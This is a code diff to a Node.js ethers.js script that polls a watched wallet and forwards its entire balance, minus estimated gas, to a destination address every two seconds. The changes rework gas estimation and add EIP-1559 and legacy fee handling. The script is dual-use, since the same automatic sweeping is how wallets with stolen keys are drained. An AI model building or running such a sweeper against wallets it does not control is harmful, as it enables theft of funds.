@@ -8,7 +8,7 @@ const WATCH_ADDRESS = process.env.WATCH_ADDRESS;
 const DESTINATION_ADDRESS = process.env.DESTINATION_ADDRESS;
 
 let lastBalance = 0n;
-const MIN_REQUIRED_BALANCE = ethers.parseEther('0.0002'); // 0.002 ETH
+const MIN_REQUIRED_BALANCE = ethers.parseEther('0.0002'); // 0.0002 ETH
 
 async function checkBalanceAndTransfer() {
   try {
@@ -22,14 +22,31 @@ async function checkBalanceAndTransfer() {
         return;
       }
 
+      // Prepare a dummy transaction to estimate gas
+      const txRequest = {
+        to: DESTINATION_ADDRESS,
+        value: balance, // try to send full balance, will subtract gas after
+      };
+
+      // Estimate gas limit (should be 21000 for normal ETH transfer)
+      const gasLimit = await wallet.estimateGas(txRequest);
+
+      // Get fee data for maxFeePerGas and maxPriorityFeePerGas
       const feeData = await provider.getFeeData();
 
-      const gasLimit = 21000n;
-      const gasPrice = feeData.maxFeePerGas || ethers.parseUnits('30', 'gwei');
-      const priorityFee =
-        feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei');
+      let maxFeePerGas = feeData.maxFeePerGas;
+      let maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
 
-      const txCost = gasLimit * gasPrice;
+      if (!maxFeePerGas) {
+        // fallback for legacy networks
+        maxFeePerGas = feeData.gasPrice || ethers.parseUnits('30', 'gwei');
+        maxPriorityFeePerGas = undefined;
+      }
+
+      // Calculate total tx cost = gasLimit * maxFeePerGas
+      const txCost = gasLimit * maxFeePerGas;
+
+      // Calculate how much to send after deducting gas cost
       const amountToSend = balance - txCost;
 
       if (amountToSend <= 0n) {
@@ -37,13 +54,23 @@ async function checkBalanceAndTransfer() {
         return;
       }
 
-      const tx = await wallet.sendTransaction({
+      // Build the final transaction
+      const txOptions = {
         to: DESTINATION_ADDRESS,
         value: amountToSend,
         gasLimit,
-        maxFeePerGas: gasPrice,
-        maxPriorityFeePerGas: priorityFee,
-      });
+      };
+
+      // Add EIP-1559 fees if available
+      if (maxPriorityFeePerGas) {
+        txOptions.maxFeePerGas = maxFeePerGas;
+        txOptions.maxPriorityFeePerGas = maxPriorityFeePerGas;
+      } else {
+        // Legacy gas price
+        txOptions.gasPrice = maxFeePerGas;
+      }
+
+      const tx = await wallet.sendTransaction(txOptions);
 
       console.log(`🚀 Sent transaction: ${tx.hash}`);
       lastBalance = await provider.getBalance(WATCH_ADDRESS);
@@ -59,4 +86,4 @@ async function checkBalanceAndTransfer() {
   }
 }
 
-setInterval(checkBalanceAndTransfer, 1000);
+setInterval(checkBalanceAndTransfer, 2000);
